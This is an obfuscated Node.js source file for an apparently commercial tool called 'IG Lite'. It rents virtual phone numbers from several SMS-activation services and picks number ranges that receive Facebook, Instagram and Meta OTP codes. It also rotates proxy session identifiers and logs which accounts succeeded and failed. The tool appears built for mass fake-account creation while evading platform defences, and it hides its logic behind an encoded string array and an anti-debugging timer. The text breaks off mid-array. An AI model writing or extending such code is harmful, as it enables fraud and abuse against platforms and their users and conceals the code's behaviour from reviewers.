const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const requiredModules = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (v6) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log("\n[SETUP] First time setup: Installing required dependencies...");
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === "win32" ? "npm.cmd" : "npm"),
        v7 = {};
      v7.stdio = "inherit", v7.shell = true, execSync('\x22' + npmCmd + "\" install https-proxy-agent socks-proxy-agent chalk@4", v7), console.log("[SETUP] Dependencies installed successfully!\n");
    } catch (v8) {
      console.error("[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly."), process.exit(1);
    }
  }
}
const https = require("https"),
  http = require("http"),
  zlib = require("zlib"),
  crypto = require("crypto");
const chalk = require("chalk"),
  readline = require("readline");
(function () {
  let v9;
  try {
    {
      const v10 = Function('return (function() {}.constructor("return this")( ));');
      v9 = v10();
    }
  } catch (v11) {
    v9 = window;
  }
  v9.setInterval(fn2, 3500);
})();
const {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent"),
  NEXA_KEY_FILE = path.join(__dirname, "nexa_key.txt"),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  TWOOO_HOST = "api.2oo9.cloud",
  TWOOO_VOLTX_GET = "/MXS47FLFX0U/tnevs/@public/api/getnum",
  TWOOO_VOLTX_CONSOLE = "/MXS47FLFX0U/tnevs/@public/api/console",
  TWOOO_STEX_GET = "/MXS47FLFX0U/tness/@public/api/getnum",
  TWOOO_STEX_CONSOLE = "/MXS47FLFX0U/tness/@public/api/console",
  SMSBOWER_HOST = "smsbower.page",
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v12) {
  return new Promise((v13, v14) => {
    const v15 = {};
    v15.hostname = SMSBOWER_HOST;
    v15.port = 0x1bb;
    v15.path = "/stubs/handler_api.php?" + v12, v15.method = "GET", v15.headers = {}, v15.headers.Accept = "text/plain", v15.headers.Connection = "close";
    const v16 = v15,
      v17 = https.request(v16, v18 => {
        {
          let v19 = '';
          v18.on("data", v20 => v19 += v20), v18.on("end", () => v13(v19.trim()));
        }
      });
    v17.on("error", v21 => v14(new Error("SmsBower net: " + v21.message))), v17.setTimeout(15000, () => {
      v17.destroy();
      v14(new Error("SmsBower timeout"));
    }), v17.end();
  });
}
function smsBowerFetchNumber(v22, v23, v24, v25) {
  let v26 = "api_key=" + encodeURIComponent(v22) + "&action=getNumber&service=" + encodeURIComponent(v23 || 'fb');
  v24 && String(v24).trim() !== '0' && String(v24).trim() !== '' && (v26 += "&country=" + encodeURIComponent(v24));
  v25 && parseFloat(v25) > 0 && (v26 += "&maxPrice=" + encodeURIComponent(v25));
  return smsBowerRequest(v26).then(v27 => {
    {
      if (v27.startsWith("ACCESS_NUMBER:")) {
        {
          const v28 = v27.split(':');
          return {
            'activationId': v28[1],
            'phoneNumber': v28[2].replace(/[^0-9]/g, '')
          };
        }
      }
      throw new Error("SmsBower: " + v27);
    }
  });
}
const ZENEX_HOST = "api.zenexnetwork.com",
  ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function zenexFetchNumber(v29, v30) {
  return new Promise((v31, v32) => {
    const v33 = {};
    v33.range = v30, v33.is_national = false, v33.remove_plus = false;
    const v34 = JSON.stringify(v33),
      v35 = {
        'hostname': ZENEX_HOST,
        'port': 0x1bb,
        'path': "/v1/getnum",
        'method': "POST",
        'headers': {
          'mapikey': v29,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v34)
        }
      },
      v36 = https.request(v35, v37 => {
        {
          let v38 = '';
          v37.on("data", v39 => v38 += v39), v37.on("end", () => {
            try {
              {
                const v40 = JSON.parse(v38);
                if (v40?.["meta"]?.["code"] === 200 && v40?.["data"]?.["full_number"]) v31(v40.data.full_number.replace(/[^0-9]/g, ''));else v32(new Error(v40?.["message"] || "Zenex: no number"));
              }
            } catch (v41) {
              v32(new Error("Zenex: invalid JSON"));
            }
          });
        }
      });
    v36.on("error", v42 => v32(new Error("Zenex net: " + v42.message))), v36.setTimeout(15000, () => {
      v36.destroy(), v32(new Error("Zenex timeout"));
    }), v36.write(v34);
    v36.end();
  });
}
class NexaRateLimiter {
  constructor(v43) {
    this.delayMs = v43;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v44) {
    return new Promise((v45, v46) => {
      {
        this.queue.push(async () => {
          try {
            v45(await v44());
          } catch (v47) {
            v46(v47);
          }
        });
        if (!this.processing) this._process();
      }
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0) {
      const v48 = this.queue.shift();
      await v48(), await new Promise(v49 => setTimeout(v49, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500),
  RUN_SALT = crypto.randomBytes(8).toString("hex");
function nexaFetchNumber(v50, v51, v52) {
  return new Promise((v53, v54) => {
    const v55 = {};
    v55.range = v51;
    v55.format = "normal";
    const v56 = JSON.stringify(v55),
      v57 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v52 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v50,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v56)
        }
      };
    const v58 = http.request(v57, v59 => {
      let v60 = '';
      v59.on("data", v61 => v60 += v61), v59.on("end", () => {
        try {
          {
            const v62 = JSON.parse(v60);
            if (v62.success && v62.number) {
              v53(v62.number.replace(/[^0-9]/g, ''));
            } else v54(new Error(v62.error || "NexaOTP: No number returned"));
          }
        } catch (v63) {
          v54(new Error("NexaOTP: Invalid response"));
        }
      });
    });
    v58.on("error", v64 => v54(new Error("NexaOTP network: " + v64.message))), v58.setTimeout(10000, () => {
      v58.destroy(), v54(new Error("NexaOTP: Timeout"));
    }), v58.write(v56), v58.end();
  });
}
const twoOoLimiter = new NexaRateLimiter(500);
function stripRid(v65) {
  return v65.replace(/X+$/i, '').trim();
}
function twoOoFetchNumber(v66, v67, v68) {
  return new Promise((v69, v70) => {
    const v71 = stripRid(v67),
      v72 = {};
    v72.rid = v71;
    const v73 = JSON.stringify(v72),
      v74 = {
        'hostname': TWOOO_HOST,
        'port': 0x1bb,
        'path': v68,
        'method': "POST",
        'headers': {
          'mauthapi': v66,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v73)
        }
      },
      v75 = https.request(v74, v76 => {
        let v77 = '';
        v76.on("data", v78 => v77 += v78);
        v76.on("end", () => {
          try {
            {
              const v79 = JSON.parse(v77);
              if (v79?.["meta"]?.["code"] === 200 && v79?.["data"]?.["no_plus_number"]) v69(v79.data.no_plus_number);else v70(new Error(v79?.["message"] || v79?.["meta"]?.["status"] || "2oo9: No number"));
            }
          } catch (v80) {
            v70(new Error("2oo9: Invalid JSON"));
          }
        });
      });
    v75.on("error", v81 => v70(new Error("2oo9 network: " + v81.message)));
    v75.setTimeout(10000, () => {
      v75.destroy();
      v70(new Error("2oo9: Timeout"));
    });
    v75.write(v73), v75.end();
  });
}
function twoOoFetchConsole(v82, v83) {
  return new Promise((v84, v85) => {
    {
      const v86 = {};
      v86.mauthapi = v82;
      const v87 = {};
      v87.hostname = TWOOO_HOST, v87.port = 0x1bb, v87.path = v83, v87.method = "GET", v87.headers = v86;
      const v88 = v87,
        v89 = https.request(v88, v90 => {
          let v91 = '';
          v90.on("data", v92 => v91 += v92), v90.on("end", () => {
            try {
              const v93 = JSON.parse(v91);
              if (v93?.["meta"]?.["code"] === 200 && Array.isArray(v93?.["data"]?.["hits"])) v84(v93.data.hits);else v85(new Error(v93?.["message"] || "Console fetch failed"));
            } catch (v94) {
              v85(new Error("Console: Invalid JSON"));
            }
          });
        });
      v89.on("error", v95 => v85(new Error("Console network: " + v95.message))), v89.setTimeout(10000, () => {
        v89.destroy(), v85(new Error("Console timeout"));
      }), v89.end();
    }
  });
}
function parseTwoOoRangeSelection(v96, v97) {
  const v98 = new Set(),
    v99 = v96.split(/[\s,]+/).filter(v100 => v100);
  for (const v101 of v99) {
    {
      const v102 = v101.match(/^(\d+)-(\d+)$/);
      if (v102) {
        for (let v103 = +v102[1]; v103 <= +v102[2]; v103++) {
          if (v103 >= 1 && v103 <= v97) v98.add(v103 - 1);
        }
      } else {
        const v104 = parseInt(v101);
        if (!isNaN(v104) && v104 >= 1 && v104 <= v97) v98.add(v104 - 1);
      }
    }
  }
  return [...v98].sort((v105, v106) => v105 - v106);
}
async function autoRangeFinderFor2Oo(v107, v108, v109, v110) {
  const v111 = {};
  v111.facebook = ["facebook", 'fb'], v111.instagram = ["instagram", 'ig'], v111.meta = ["meta"], v111.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v112 = v111,
    v113 = {};
  v113.facebook = "📘 Facebook", v113.instagram = "📸 Instagram", v113.meta = "🌐 Meta", v113.all = "📦 All (FB+IG+Meta)";
  const v114 = v113;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v115 = [];
  try {
    v115 = await twoOoFetchConsole(v107, v108);
  } catch (v124) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v124.message + '\x0a')), null;
  }
  const v116 = v115.slice(0, 100);
  if (v116.length === 0) {
    return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  }
  const v117 = await v109("Filter by app:", [{
    'name': "📘 Facebook",
    'value': "facebook"
  }, {
    'name': "📸 Instagram",
    'value': "instagram"
  }, {
    'name': "🌐 Meta",
    'value': "meta"
  }, {
    'name': "📦 All (FB+IG+Meta)",
    'value': "all"
  }]);
  const v118 = v112[v117],
    v119 = v116.filter(v125 => {
      const v126 = (v125.sid || '').toLowerCase(),
        v127 = (v125.message || '').toLowerCase();
      return v118.some(v128 => v126.includes(v128) || v127.includes(v128));
    });
  if (v119.length === 0) return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  const v120 = {},
    v121 = {};
  for (const v129 of v119) {
    const v130 = v129.range || '';
    if (!v130) continue;
    v120[v130] = (v120[v130] || 0) + 1;
    const v131 = {};
    v131.facebook = 0x0, v131.instagram = 0x0, v131.meta = 0x0, v121[v130] = v121[v130] || v131;
    if (v112.facebook.some(v132 => (v129.sid || '').toLowerCase().includes(v132) || (v129.message || '').toLowerCase().includes(v132))) v121[v130].facebook++;
    if (v112.instagram.some(v133 => (v129.sid || '').toLowerCase().includes(v133) || (v129.message || '').toLowerCase().includes(v133))) v121[v130].instagram++;
    if (v112.meta.some(v134 => (v129.sid || '').toLowerCase().includes(v134) || (v129.message || '').toLowerCase().includes(v134))) v121[v130].meta++;
  }
  const v122 = Object.entries(v120).sort((v135, v136) => v136[1] - v135[1]).slice(0, 5);
  if (v122.length === 0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v123 = await v109("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v123 === "auto") {
    {
      const [v137, v138] = v122[0],
        v139 = v121[v137] || {},
        v140 = [];
      if (v139.facebook) v140.push("📘FB(" + v139.facebook + ')');
      if (v139.instagram) v140.push("📸IG(" + v139.instagram + ')');
      if (v139.meta) v140.push("🌐Meta(" + v139.meta + ')');
      return console.log(chalk.green("\n  ✓ Auto Range: " + v137 + "  (" + v138 + " hits)  " + v140.join('\x20') + '\x0a')), [v137];
    }
  } else {
    {
      console.log(chalk.cyan("\n  App: " + v114[v117] + "  |  Scanned: " + v119.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(22))), v122.forEach(([v144, v145], v146) => {
        const v147 = v121[v144] || {},
          v148 = [];
        if (v147.facebook) v148.push("📘FB(" + v147.facebook + ')');
        if (v147.instagram) v148.push("📸IG(" + v147.instagram + ')');
        if (v147.meta) v148.push("🌐Meta(" + v147.meta + ')');
        console.log(chalk.cyan('\x20\x20' + String(v146 + 1).padEnd(3) + '\x20') + chalk.green(v144.padEnd(16)) + chalk.yellow(String(v145).padEnd(5)) + chalk.gray('█'.repeat(Math.min(v145, 12)) + '\x20\x20') + (v148.join('\x20') || chalk.gray('?')));
      }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
      const v141 = await v110("Select ranges:", ''),
        v142 = parseTwoOoRangeSelection(v141, v122.length);
      if (v142.length === 0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
      const v143 = v142.map(v149 => v122[v149][0]);
      return console.log(chalk.green("\n  ✓ Selected: " + v143.join(',\x20') + '\x0a')), v143;
    }
  }
}
const DIAL_MAP = [["1868", 'TT', "en_TT", "-14400"], ["1876", 'JM', "en_JM", "-18000"], ["1809", 'DO', "es_DO", "-14400"], ["1829", 'DO', "es_DO", "-14400"], ["1849", 'DO', "es_DO", "-14400"], ["375", 'BY', "ru_BY", "10800"], ["880", 'BD', "bn_BD", "21600"], ["855", 'KH', "km_KH", "25200"], ["856", 'LA', "lo_LA", "25200"], ["228", 'TG', "fr_TG", '0'], ["229", 'BJ', "fr_BJ", "3600"], ["233", 'GH', "en_GH", '0'], ["234", 'NG', "en_NG", "3600"], ["237", 'CM', "fr_CM", "3600"], ["243", 'CD', "fr_CD", "3600"], ["254", 'KE', "sw_KE", "10800"], ["255", 'TZ', "sw_TZ", "10800"], ["256", 'UG', "en_UG", "10800"], ["260", 'ZM', "en_ZM", "7200"], ["263", 'ZW', "en_ZW", "7200"], ["212", 'MA', "ar_MA", '0'], ["213", 'DZ', "ar_DZ", "3600"], ["216", 'TN', "ar_TN", "3600"], ["218", 'LY', "ar_LY", "7200"], ["220", 'GM', "en_GM", '0'], ["221", 'SN', "fr_SN", '0'], ["222", 'MR', "ar_MR", '0'], ["223", 'ML', "fr_ML", '0'], ["224", 'GN', "fr_GN", '0'], ["225", 'CI', "fr_CI", '0'], ["226", 'BF', "fr_BF", '0'], ["227", 'NE', "fr_NE", "3600"], ["230", 'MU', "en_MU", "14400"], ["231", 'LR', "en_LR", '0'], ["232", 'SL', "en_SL", '0'], ["235", 'TD', "fr_TD", "3600"], ["236", 'CF', "fr_CF", "3600"], ["238", 'CV', "pt_CV", "-3600"], ["239", 'ST', "pt_ST", '0'], ["240", 'GQ', "es_GQ", "3600"], ["241", 'GA', "fr_GA", "3600"], ["242", 'CG', "fr_CG", "3600"], ["244", 'AO', "pt_AO", "3600"], ["245", 'GW', "pt_GW", '0'], ["246", 'IO', "en_IO", "21600"], ["247", 'AC', "en_AC", '0'], ["248", 'SC', "en_SC", "14400"], ["249", 'SD', "ar_SD", "7200"], ["250", 'RW', "rw_RW", "7200"], ["251", 'ET', "am_ET", "10800"], ["252", 'SO', "so_SO", "10800"], ["253", 'DJ', "fr_DJ", "10800"], ["257", 'BI', "fr_BI", "7200"], ["258", 'MZ', "pt_MZ", "7200"], ["261", 'MG', "mg_MG", "10800"], ["262", 'RE', "fr_RE", "14400"], ["264", 'NA', "en_NA", "7200"], ["265", 'MW', "en_MW", "7200"], ["266", 'LS', "en_LS", "7200"], ["267", 'BW', "en_BW", "7200"], ["268", 'SZ', "en_SZ", "7200"], ["269", 'KM', "fr_KM", "10800"], ["966", 'SA', "ar_SA", "10800"], ["971", 'AE', "ar_AE", "14400"], ["973", 'BH', "ar_BH", "10800"], ["974", 'QA', "ar_QA", "10800"], ["968", 'OM', "ar_OM", "14400"], ["965", 'KW', "ar_KW", "10800"], ["964", 'IQ', "ar_IQ", "10800"], ["963", 'SY', "ar_SY", "10800"], ["962", 'JO', "ar_JO", "10800"], ["961", 'LB', "ar_LB", "7200"], ["967", 'YE', "ar_YE", "10800"], ["970", 'PS', "ar_PS", "10800"], ["972", 'IL', "he_IL", "7200"], ["992", 'TJ', "tg_TJ", "18000"], ["993", 'TM', "tk_TM", "18000"], ["994", 'AZ', "az_AZ", "14400"], ["995", 'GE', "ka_GE", "14400"], ["996", 'KG', "ky_KG", "21600"], ["998", 'UZ', "uz_UZ", "18000"], ["977", 'NP', "ne_NP", "20700"], ["975", 'BT', "dz_BT", "21600"], ["959", 'MM', "my_MM", "23400"], ["670", 'TL', "pt_TL", "32400"], ["673", 'BN', "ms_BN", "28800"], ["676", 'TO', "en_TO", "46800"], ["677", 'SB', "en_SB", "39600"], ["678", 'VU', "en_VU", "39600"], ["679", 'FJ', "en_FJ", "43200"], ["680", 'PW', "en_PW", "32400"], ["591", 'BO', "es_BO", "-14400"], ["592", 'GY', "en_GY", "-14400"], ["593", 'EC', "es_EC", "-18000"], ["594", 'GF', "fr_GF", "-10800"], ["595", 'PY', "es_PY", "-14400"], ["596", 'MQ', "fr_MQ", "-14400"], ["597", 'SR', "nl_SR", "-10800"], ["598", 'UY', "es_UY", "-10800"], ['20', 'EG', "ar_EG", "7200"], ['27', 'ZA', "en_ZA", "7200"], ['30', 'GR', "el_GR", "7200"], ['31', 'NL', "nl_NL", "3600"], ['32', 'BE', "nl_BE", "3600"], ['33', 'FR', "fr_FR", "3600"], ['34', 'ES', "es_ES", "3600"], ['36', 'HU', "hu_HU", "3600"], ['39', 'IT', "it_IT", "3600"], ['40', 'RO', "ro_RO", "7200"], ['41', 'CH', "de_CH", "3600"], ['43', 'AT', "de_AT", "3600"], ['44', 'GB', "en_GB", '0'], ['45', 'DK', "da_DK", "3600"], ['46', 'SE', "sv_SE", "3600"], ['47', 'NO', "nb_NO", "3600"], ['48', 'PL', "pl_PL", "3600"], ['49', 'DE', "de_DE", "3600"], ['51', 'PE', "es_PE", "-18000"], ['52', 'MX', "es_MX", "-21600"], ['53', 'CU', "es_CU", "-18000"], ['54', 'AR', "es_AR", "-10800"], ['55', 'BR', "pt_BR", "-10800"], ['56', 'CL', "es_CL", "-14400"], ['57', 'CO', "es_CO", "-18000"], ['58', 'VE', "es_VE", "-14400"], ['60', 'MY', "ms_MY", "28800"], ['61', 'AU', "en_AU", "36000"], ['62', 'ID', "id_ID", "25200"], ['63', 'PH', "en_PH", "28800"], ['64', 'NZ', "en_NZ", "43200"], ['65', 'SG', "en_SG", "28800"], ['66', 'TH', "th_TH", "25200"], ['81', 'JP', "ja_JP", "32400"], ['82', 'KR', "ko_KR", "32400"], ['84', 'VN', "vi_VN", "25200"], ['86', 'CN', "zh_CN", "28800"], ['90', 'TR', "tr_TR", "10800"], ['91', 'IN', "hi_IN", "19800"], ['92', 'PK', "ur_PK", "18000"], ['93', 'AF', "ps_AF", "16200"], ['94', 'LK', "si_LK", "19800"], ['95', 'MM', "my_MM", "23400"], ['98', 'IR', "fa_IR", "12600"], ['1', 'US', "en_US", "-18000"], ['7', 'RU', "ru_RU", "10800"]];
function getPhoneDetails(v150) {
  for (const [v152, v153, v154, v155] of DIAL_MAP) {
    {
      if (v150.startsWith(v152)) {
        const v156 = {};
        return v156.iso = v153, v156.locale = v154, v156.offset = v155, v156.prefix = v152, v156;
      }
    }
  }
  const v151 = {};
  v151.iso = 'US';
  return v151.locale = "en_US", v151.offset = "-18000", v151.prefix = '1', v151;
}
let SUCCESSFUL_FILE = "successful.txt",
  FAILED_FILE = "failed.txt";
function dbg() {}
let WHATSAPP_FILE = "whatsapp.txt";
const B = chalk.hex("#00FF88");
const C = chalk.hex("#00BFFF"),
  Y = chalk.hex("#FFD700"),
  W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF6B6B");
let globalHwid = "Unregistered",
  globalPingInterval;
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(C("   ___ ____   _     _ _       "));
    console.log(C("  |_ _/ ___| | |   (_) |_ ___ "));
    console.log(C("   | | |  _  | |   | | __/ _ \\"));
    console.log(C("   | | |_| | | |___| | ||  __/"));
    console.log(C("  |___\\____| |_____|_|\\__\\___|"));
    console.log(C("                              \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + C("IG Lite                      ") + W('│'));
    console.log(W("│ [•] Developer : ") + C("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium Build                ") + W('│'));
    console.log(W("│ [•] Version   : ") + C("IGLITE-V4.0.0                ") + W('│'));
    globalHwid !== "Unregistered" && console.log(W("│ [•] HWID      : ") + Y(globalHwid.padEnd(27)) + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
function normalizePhoneNumber(v157) {
  let v158 = v157.replace(/\D/g, '');
  if (!v158.startsWith('+')) {
    v158 = '+' + v158;
  }
  return v158;
}
function parseProxy(v159) {
  if (!v159) return null;
  if (typeof v159 === "object") return v159;
  v159 = v159.trim();
  if (!v159) return null;
  let v160,
    v161,
    v162,
    v163,
    v164 = "http";
  if (v159.startsWith("socks5://")) v164 = "socks5", v159 = v159.slice(9);else {
    if (v159.startsWith("socks4://")) v164 = "socks4", v159 = v159.slice(9);else {
      if (v159.startsWith("http://")) v164 = "http", v159 = v159.slice(7);else v159.startsWith("https://") && (v164 = "http", v159 = v159.slice(8));
    }
  }
  if (v159.includes('@')) {
    {
      const v166 = v159.split('@'),
        v167 = v166[0].split(':'),
        v168 = v166[1].split(':');
      v162 = v167[0], v163 = v167[1], v160 = v168[0], v161 = parseInt(v168[1]);
    }
  } else {
    const v169 = v159.split(':');
    if (v169.length === 2) {
      v160 = v169[0], v161 = parseInt(v169[1]);
    } else {
      if (v169.length === 4) !isNaN(parseInt(v169[3])) && isNaN(parseInt(v169[1])) ? (v162 = v169[0], v163 = v169[1], v160 = v169[2], v161 = parseInt(v169[3])) : (v160 = v169[0], v161 = parseInt(v169[1]), v162 = v169[2], v163 = v169[3]);else v169.length === 3 && (v160 = v169[0], v161 = parseInt(v169[1]), v162 = v169[2]);
    }
  }
  if (!v160 || !v161) return null;
  const v165 = {};
  v165.type = v164, v165.host = v160;
  v165.port = v161, v165.user = v162;
  return v165.pass = v163, v165.original = v159, v165;
}
function rotateSessionId(v170) {
  if (!v170 || !v170.user) return v170;
  const v171 = {
      ...v170
    },
    v172 = v171,
    v173 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  let v174 = false;
  for (const v175 of v173) {
    {
      if (v172.user && v175.test(v172.user)) {
        {
          const v176 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
          v172.user = v172.user.replace(v175, '' + v175.source.split('[')[0].replace(/\\/g, '') + v176), v174 = true;
          break;
        }
      }
      if (v172.pass && v175.test(v172.pass)) {
        const v177 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v172.pass = v172.pass.replace(v175, '' + v175.source.split('[')[0].replace(/\\/g, '') + v177), v174 = true;
        break;
      }
    }
  }
  return v172;
}
function createProxyAgent(v178) {
  if (!v178) return null;
  let v179 = '';
  return v178.type === "socks5" || v178.type === "socks4" ? (v179 = "socks5://" + (v178.user ? encodeURIComponent(v178.user) + ':' + encodeURIComponent(v178.pass || '') + '@' : '') + v178.host + ':' + v178.port, new SocksProxyAgent(v179)) : (v179 = "http://" + (v178.user ? encodeURIComponent(v178.user) + ':' + encodeURIComponent(v178.pass || '') + '@' : '') + v178.host + ':' + v178.port, new HttpsProxyAgent(v179));
}
function fn1() {
  const v180 = ['AwXL', 'yMDKuq', 'zxnFvG', 'v0LeoG', 'nJC3', 'zLj3yW', 'q0z1zq', 'Bxj0Aa', 'uxrora', 'luvYCG', 'sfP0uG', 'tMHTza', 'qM5Pwa', 'kI8Q', 'rKL0uG', 'DhmGka', 'w0Lhlq', 'EKeTwG', 'zMneDG', 'EwvWuq', 'Dhzuqq', 'EhvjAq', 'zhvzvW', 'owqWzG', 'isbqBa', 'zxmUia', 'BxnFqG', 'tLjNtG', 'yKnOqq', 'DhDVCG', 'rLzota', 'z3f3AW', 'uK9mza', 'v2LTDq', 'ie5LDa', 'DMvYCW', 'suqGia', 'zgzvDa', 'yujnCa', 'uYbgsq', 'ywjSzq', 'EgrLAW', 'u3nrqq', 'tK9UBG', 'DfXdCG', 'yxLLCG', 'vdSGCq', 'nZvJnG', 'y29UCW', 'Edi5oq', 'zvr6EG', 'wKDYta', 'zLzYAa', 'zuzPBa', 'CMfUzW', 'mJe2nW', 'D2HHDa', 'rKvJrW', 'AMfFsG', 'ywP5tW', 'EKLYta', 'wfHykq', 'mvbfAeD3vW', 'BxbLCG', 'C291CG', 'wgjSrW', 'Dg8GzW', 'C3bLCW', 'qKfWDG', 'zxiGyG', 'ohW2Fa', 'BM9YBq', 'C2vUza', 'zM9VCq', 'y0zoqW', 'rLzuvW', 'ie51Bq', 'B3mYmG', 'DfvLCq', 'nZaW', 'AwvZ', 'vvPwva', 'AgfZ', 'mtGWma', 'm2q5yW', 'r3zOvq', 'igzLDa', 'DxjYzq', 'EgLbrq', 'DvPmzW', 'DxjJDa', 'rMHdCG', 'C2v0lq', 'u0nRyG', 'CIbYyq', 'yunoEa', 'q2DgDW', 'EwvdBW', 'vxrfyG', 'sNbQCG', 'BfPQDa', 'ndDgta', 'Bca4ia', 'icaGxW', 'zNjFra', 'EvLJyW', 'mJeWoq', 'ieLhkq', 'Ee1eta', 'z0Hntq', '8j+mKe1LDa', 'sMzxBq', 'vvb3zG', 'yLjRCW', 'CLbbBa', 'zxHItW', 'Aw5WDq', 'nMqXzq', 'C3rKBW', 'Aw5NCW', 'tM8GBG', 'BvvJCG', 'C2vZsq', 'uvrjDW', 'uLKGia', 'u1nFtG', 'ndG1wa', 'sKzLua', 'zgf0yq', 'u2nYyq', 'B3iGBa', 'C2rToa', 'ndu2nW', 'sMPnwq', 'Aw9UlW', 'C2vHCG', 'DhnxAq', 'mtnLzG', 'q05yDW', 'A2PlAG', 'Cg5xuG', 'zwXFrW', 'mKXNBq', 'DhjPBq', 'iM9RiG', 'r2L1uW', 'yuv5BG', 'AM5vBW', 'AeTYyq', 'BsbwBW', 'svr6BG', 'zJLKma', 'lI4k', 'tu9bzG', 'y2y1yG', 'B2rouG', 'vu5iyG', 'vgHQDW', 'sefNrq', 'rgTZDG', 'igfUBW', 'AuXpvG', 'Aw1Lia', 'n2y0yG', 'DuLeyG', 'zNrIAq', 'mLz3qq', 'ChnLza', 'qLbOAa', 'AgL0CW', 'lIbqBa', 'lNjLzW', 'uufTsq', '4QYf77IpiejH', 'rgLZCa', 'A2LHEa', 'DvfdyG', 'z1rbEG', 'CxfqzW', 'uMvZCa', 'BNnLoG', 'zhbVAq', 'wfnwrG', 'oIboBW', 'zgvFqq', 'wK1AqW', 'ucbMBW', 'wxLnua', 'y2rHyG', 'q0rLwG', 'B3aGnq', 'vgnTCG', 'Ev9Tzq', 'uvvpyq', 'Bsbttq', 'mJm3', 'y1zOBq', 'ihDLyG', 'zxi/', 'AxPotW', 'wxvQuG', 'B2fZuW', 'wMzdqG', 'v3fSza', 'rgvWzq', 'zufIzq', 'zxqTsq', 'tvn1sW', 'DMvmAq', 'zcaGia', 'CMvKia', 'sxnLuG', 'DvDAza', 'rLbgvW', 'yMu4yW', 'rxDpDW', 'EsbHCa', 'icGJmq', 'z1DVsq', 'icHTyq', 'Exb0sW', 'yMX3rq', 'C2HHmG', 'FgLNBa', 'mJuW', 'icG0mG', 'DM5wzq', 'BuDmDW', 'oI8VBG', 'yxjFuW', 'EsbMBa', 'mJuZ', 'surdtq', 'zKD3Da', 'w1jfva', 'Dg9gAq', 'yK9fAq', 'ihvUza', 'mZyWma', 'quflBG', 'ifjftq', 'C0rjtG', 'yxbPlG', 'icaG4PYx', 't0zuvW', 'ifnLBa', 'tfLtvG', 'C3rLBG', 'uwjmrW', 'BcbODa', 'ugTlsG', 'icaG', 'tufPDa', 'vhjPzW', 'rLfsqW', 'zxbLyq', 'C3rHBa', 'ifnnuW', 'DKrADa', 'z0P2DW', 'v1vNwa', 'sxHQuG', 'jMfJDa', 'B3mXmG', 'zxnFtq', 'q2nHDG', 'AxnFBG', 'AYa9ia', 'g1SWBq', 'zY4UlG', 'DxjPBG', 'l01yuW', 'Afnhqq', 'CIbUzq', 'AMrItq', 'CNfSyG', 'A2z6wq', 'AgLZiG', 'ihrYAq', 'yLvnqG', 'CMvHza', 'uKvkCq', 'zgvFqW', 'mJi4', 'DwWUDa', 'C3DFva', 'psbHBG', 'icaGgW', 'icHYyq', 'igzPBa', 'B0HvCa', 'zwfKCW', 'vw5RBG', 'Dg90yq', 'CMXLBG', 'A2v5', 'yxn0zq', 'y1vOzW', 'rs1jra', 'CvfbsW', 'B0nuyq', 'sMjmta', 'tfHcuW', '4Psm4Psa4Psa4Psa', 'C2vSzq', 'q1bimG', 'lwLK', 'rxnKzG', 'z2H0', 'v0L0qG', 'r3vQva', 'oty1', 'sM9krG', 'C1viyG', 'BhvZ', 'zvbtCq', 'D2rkEq', 'DgPwsG', 'lxb1CW', '4Ocuie9u', 'qLPIzW', 'sffgtW', 'y1jIsG', 'vxfWEG', 'q1rXua', 'lteWoa', 'ieLUCa', 'mtC0oduWmNPRqMHZvq', 'tvjJwq', 'EhD1tG', 'rvnt', 'odu2', 'q1nsrG', 'sw9xqq', 'q3DwBG', 'D0f2vG', 'ze5eAG', 'C203mW', 'pvWNqW', 'zxnZ', 'z2LwAq', 'uhrOqW', 'zwfTAq', 'ELj6rG', 'vhjOuG', 'icbqCG', 'zw50lq', 'suXf', 'BNnWzW', 'uw5lDG', 'ihrVia', 'zgLYBG', 'ruLYCG', 'v0vjuG', 'CMLHBa', 'EgroDq', 